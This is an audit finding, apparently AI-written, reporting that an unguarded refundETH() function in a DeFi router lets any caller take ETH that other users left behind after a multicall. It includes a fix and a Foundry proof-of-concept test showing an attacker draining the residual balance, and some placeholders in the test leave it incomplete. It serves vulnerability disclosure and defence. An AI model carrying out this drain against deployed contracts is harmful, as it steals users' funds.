The vulnerability claim is **valid**. Here is the full analysis:

---

### Title
Unguarded `refundETH()` allows any caller to steal residual ETH left on the router after a multicall — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`refundETH()` has no access control and unconditionally sends the router's entire native ETH balance to `msg.sender`. Because `multicall` is `payable` and the `pay()` function only wraps exactly `amountIn` worth of ETH (leaving any excess on the contract), a victim who omits `refundETH()` from their multicall leaves residual ETH on the router that any attacker can steal in a subsequent transaction.

---

### Finding Description

`refundETH()` is defined as: [1](#0-0) 

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
```

There is no check that `msg.sender` is the original ETH depositor. It sends the **entire** contract ETH balance to whoever calls it.

ETH enters the router legitimately via `multicall`, which is `payable`: [2](#0-1) 

Inside `pay()`, when `token == WETH`, the router wraps only the exact `value` needed for the swap, leaving any excess `msg.value - value` as raw ETH on the contract: [3](#0-2) 

The `receive()` guard (which rejects non-WETH senders) does **not** apply here — ETH sent with a `payable` function call bypasses `receive()` entirely. [4](#0-3) 

---

### Impact Explanation

Direct theft of user ETH principal. A victim who sends `msg.value = 1 ETH` but only swaps `0.5 ETH` and forgets to append `refundETH()` to their multicall leaves `0.5 ETH` on the router. Any attacker can call `refundETH()` in a separate transaction and receive the full residual balance. No special privileges are required.

---

### Likelihood Explanation

- `multicall` is the standard entry point for batching swaps with ETH; users routinely send excess ETH to cover slippage.
- Omitting `refundETH()` from a multicall is a realistic user mistake (no on-chain enforcement forces its inclusion).
- The attack is trivially executable by monitoring the mempool or the router's ETH balance.
- MEV bots will reliably extract any residual ETH within the same block.

---

### Recommendation

Add a mapping from depositor address to deposited amount (or use transient storage) so that `refundETH()` can only return ETH to the address that originally sent it. Alternatively, enforce that `refundETH()` can only be called as part of a `multicall` (e.g., via a `msg.sender == address(this)` guard), preventing standalone external calls.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "metric-periphery/contracts/MetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    MetricOmmSimpleRouter router;
    address victim  = address(0xBEEF);
    address attacker = address(0xBAD);

    function setUp() public {
        // deploy router with real WETH + factory (or mocks)
        router = new MetricOmmSimpleRouter(WETH_ADDR, FACTORY_ADDR);
    }

    function testAttackerStealsResidualETH() public {
        // Victim sends 1 ETH via multicall, swap only consumes 0.5 ETH,
        // no refundETH() call included in the batch.
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(router.exactInputSingle, (/* amountIn=0.5 ETH params */));
        router.multicall{value: 1 ether}(calls);

        // Router now holds 0.5 ETH residual.
        assertEq(address(router).balance, 0.5 ether);

        // Attacker calls refundETH() in a separate tx.
        vm.prank(attacker);
        router.refundETH();

        // Attacker received victim's ETH.
        assertEq(attacker.balance, 0.5 ether);
        assertEq(address(router).balance, 0);
    }
}
```
